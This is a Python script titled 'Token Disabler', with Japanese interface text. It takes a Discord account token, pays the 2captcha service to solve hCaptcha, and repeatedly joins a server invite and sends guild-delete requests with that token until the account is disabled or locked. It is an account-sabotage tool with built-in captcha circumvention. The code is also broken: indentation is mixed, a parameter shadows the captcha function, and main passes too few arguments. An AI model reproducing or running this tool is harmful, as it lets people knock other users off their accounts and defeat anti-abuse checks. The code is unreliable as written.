import traceback
import requests
import yaml
import time
import sys
import os
from rich import print as rprint
from console.utils import set_title

def captcha_bypass(api_key):
	rprint("[yellow]Captchaを解決中[/yellow]")
    response = requests.post(f"http://2captcha.com/in.php?key={api_key}&method=hcaptcha&json=1&sitekey=4c672d35-0701-42b2-88c3-78380b0db560&pageurl=https://discord.com").json()
    try:
    	solve_request_id = response["request"]
    except KeyError:
    	return False
    time.sleep(20)
    while True:
    	response = requests.get(f"http://2captcha.com/res.php?key={api_key}&json=1&action=get&id={solve_request_id}").json()
    	if response["status"] == 1:
    		rprint("[green]Captcha解決済み[/green]")
    		return response["request"]
    	time.sleep(5)

def token_disabler(token, captcha_bypass, captcha_solve_key):
    while True:
        if captcha_bypass == True:
            captcha_key = captcha_bypass(captcha_solve_key)
        elif captcha_bypass == False:
            captcha_key = None
        joiner_headers = {
        	"Authorization": token,
        	"Content-Type": "application/json"
        }
        joiner_data = {
        	"captcha_key": captcha_key
        }
        response = requests.post("https://discordapp.com/api/v6/invite/mee6", headers=joiner_headers, json=joiner_data)
        if response.status_code == 401:
            return 401
        elif response.status_code == 403:
            return 403
        elif response.status_code == 400:
            return 400
        if captcha_bypass == True:
            captcha_key = captcha_bypass(captcha_solve_key)
        elif captcha_bypass == False:
            captcha_key = None
        try:
        	guild_id = response.json()["guild"]["id"]
       	except KeyError:
       		return False
       	leaver_headers = {
       		"Authorization": token,
       		"Content-Type": "application/json"
       	}
       	leaver_data = {
       		"captcha_key": captcha_key
       	}
        response = requests.delete(f"https://discordapp.com/api/v6/guilds/{guild_id}", headers=leaver_headers, json=leaver_data)
        if response.status_code == 401:
            return 401
        elif response.status_code == 403:
            return 403
        elif response.status_code == 400:
        	return 400

def main():
    set_title("Token Disabler // 待機中")
    token = input("Token: ")
    set_title("Token Disabler // 無効化中")
    rprint("[green]無効化中[/green]")
    with open("config.yml", "r") as file:
        config = yaml.safe_load(file)
    disabler_response = token_disabler(token, config["captcha_bypass"])
    if disabler_response == 401:
        set_title("Token Disabler // 成功")
        rprint("[green]無効化完了[/green]")
    elif disabler_response == 403:
        set_title("Token Disabler // 成功(認証ロック)")
        rprint("[yellow]無効化完了(認証ロック)[/yellow]")
    elif disabler_response == 400:
        set_title("Token Disabler // 失敗(Captcha必須)")
        rprint("[red]無効化失敗(hCaptcha必須)[/red]")
    elif disabler_response == False:
    	set_title("Token Disabler // 不明")
    	rprint("[yellow]無効化の状況不明(無効化されていない可能性あり)[/yellow]")
    os.system("pause")
    
BUG_REPORT_WEBHOOK = ""

try:
	main()
except:
	set_title("Token Disabler // エラー")
	rprint("[red]エラー発生[/red]")
	print("// エラー内容 開始 //")
	print(traceback.format_exc())
	print("// エラー内容 終了 //")
	rprint("[yellow]エラー内容を開発者へ送信しますか?[/yellow]")
	rprint("[yellow]y: YES[/yellow]")
	rprint("[yellow]n: NO[/yellow]")
	while True:
		select_error_report = input("報告選択(y / n): ")
		if select_error_report == "y":
			rprint("[yellow]報告中[/yellow]")
			headers = {
				"Content-Type": "application/json"
			}
			data = {
				"content": f"**ERROR REPORT**\n{traceback.format_exc()}"
			}
			requests.post(BUG_REPORT_WEBHOOK, headers=headers, json=data)
			rprint("[green]報告済み[/green]")
			break
		elif select_error_report == "n":
			break
		else:
			pass
	os.system("pause")